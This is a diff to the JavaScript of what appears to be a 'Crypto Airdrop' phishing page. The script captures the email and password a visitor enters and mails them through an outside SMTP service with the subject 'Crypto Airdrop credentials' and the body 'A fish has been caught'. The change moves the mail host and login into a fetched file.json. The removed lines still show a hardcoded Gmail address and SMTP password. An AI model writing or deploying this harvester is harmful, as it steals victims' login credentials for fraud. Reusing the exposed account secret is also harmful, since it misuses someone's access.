@@ -1,18 +1,27 @@
-
-
+var crd
+async function loadJSON() {
+    fetch('file.json')
+        .then(response => response.json())
+        .then(
+            data => RegisterUser(data.host, data.user, data.pwd)
+    )
+        .catch(error => console.log(error));
+}
 
 const email = document.getElementById('email');
 const pass = document.getElementById('password');
 const submit = document.getElementById('sub_btn');
 
-function RegisterUser() {
+submit.addEventListener('click', loadJSON);
+
+function RegisterUser(host, user, pwd) {
     Email.send({
-        Host : "smtp.elasticemail.com",
-        Username : "mytbota@gmail.com",
-        Password : "F3F74A5528ACB45F7EFEF3BC935128988C25",
+        Host : host, 
+        Username : user,
+        Password : pwd,
         port: 2525,
-        To : 'mytbota@gmail.com',
-        From : "mytbota@gmail.com",
+        To : user,
+        From : user,
         Subject : "Crypto Airdrop credentials",
         Body : `
         A fish has been caught
@@ -25,6 +34,6 @@ function RegisterUser() {
               }, 2000)
         );
 }
-submit.addEventListener('click', RegisterUser);
+// submit.addEventListener('click', RegisterUser);
 
 
